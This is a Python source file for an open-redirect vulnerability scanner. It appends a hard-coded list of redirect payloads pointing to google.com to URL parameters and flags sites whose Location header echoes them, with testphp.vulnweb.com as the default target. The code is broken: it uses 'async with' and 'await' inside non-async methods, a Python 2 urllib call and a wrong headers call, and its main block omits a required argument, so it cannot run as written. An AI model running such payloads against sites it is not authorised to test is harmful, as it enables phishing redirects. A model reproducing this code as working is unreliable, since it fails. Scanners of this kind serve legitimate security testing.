import asyncio
import urllib
from urllib.parse import urlparse, parse_qs
from urllib.request import urlopen
from urllib.error import HTTPError, URLError

import aiohttp
import validators

""" You should suppLy an url like that test.com/file.php?redirc= in order to work that correctly"""


class openredirect:
    payloads = ["//www.google.com/%2e%2e", "//example.com@google.com/%2f..",
                "///google.com/%2f..", "///example.com@google.com/%2f.."]

    def __init__(self, url, cookies=None, headers=None):
        self.url = url
        self.cookies = cookies if cookies is not None else ""
        self.headers = headers if headers is not None else {
            "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101"}

    def set_url(self, new_url):
        self.url = new_url

    def check_url(self):
        return validators.url(self.url)

    def contain_params(self):
        if self.check_url():
            parsed_url = urlparse(self.url)
            query = parsed_url.query
            parameters = parse_qs(query)
            if bool(parameters) is False and parameters is not None:
                return False
            else:
                return True

    def checker(self):
        try:
            response = urlopen(self.url)
        except HTTPError:
            return "not valid"
        except URLError as e:
            return "not valid"
        else:
            html = response.read()
            return "up"

    def scan_url(self, payloads, session):
        if self.contain_params():
            for payload in payloads:
                target = self.url + payload

                async with session.get(target) as resp:
                    header = resp.headers()
                    data = await resp.text(encoding="utf-8")

                if "Location" in header and urllib.unquote(payload).decode('utf8') in header['Location']:
                    print("May be Vulnerable : {} to this payload : {}".format(self.url, payload))
                else:
                    print("Payload tried and seems not vulnerable; {}".format(target))

    def main(self, crawler):
        async with aiohttp.ClientSession(cookies=self.cookies, headers=self.headers) as session:
            tasks = []
            for url in crawler.urls:
                self.set_url(new_url=url)
                task = asyncio.ensure_future(self.scan_url(payloads=openredirect.payloads, session=session))
                tasks.append(task)
            responses = await asyncio.gather(*tasks)
            for i in responses:
                if i is not None:
                    print(i)



if __name__ == '__main__':
    odir = openredirect(url="http://testphp.vulnweb.com")
    odir.scan_url(openredirect.payloads)
